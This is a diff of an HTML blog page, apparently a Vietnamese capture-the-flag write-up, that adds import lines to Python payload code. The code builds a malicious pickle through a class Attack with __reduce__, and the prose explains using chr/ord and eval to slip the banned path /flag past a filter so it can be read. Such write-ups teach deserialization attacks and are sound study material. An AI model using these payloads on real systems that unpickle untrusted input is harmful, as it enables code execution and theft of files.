@@ -101,7 +101,7 @@
     "keywords": ["Web"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "1451"
+    "wordCount": "1459"
   }]
   </script>
 
@@ -1104,7 +1104,9 @@
 <li>Ý tưởng sẽ là dumps 1 pickle chứa lệnh exec mà trong đó chứa một raise error để xem file /flag bằng lệnh open().read(). Nhưng mà /flag lại nằm trong những từ bị cấm thì phải làm sao ? Mình sẽ chuyển hết các char trong chữ /flag sang mã ascii bằng hàm ord và bọc lại bằng hàm chr từ đó bọc lại tiếp bằng hàm eval() để có thực hiện hết các lệnh ban nãy.</li>
 </ul>
 <p>Vì thế mình có payload sau :</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">convert</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">convert</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;+&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s2">&#34;chr(</span><span class="si">{</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">)&#34;</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">])</span>
 </span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Attack</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
@@ -1123,7 +1125,9 @@
   </figure>
 </p>
 <p>Ngoài ra khi mình thay đổi độ dài của chuỗi binary đã được dumps thì bit thứ 4 tượng trưng cho độ dài của chuỗi cũng sẽ giảm đi 1 để có thể thực hiện disassemble. Ngoài ra chuỗi phải được encode base64 để được decode như ở source trên, nên payload của mình trở thành như sau</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">convert</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">convert</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;+&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s2">&#34;chr(</span><span class="si">{</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">)&#34;</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">])</span>
 </span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Attack</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
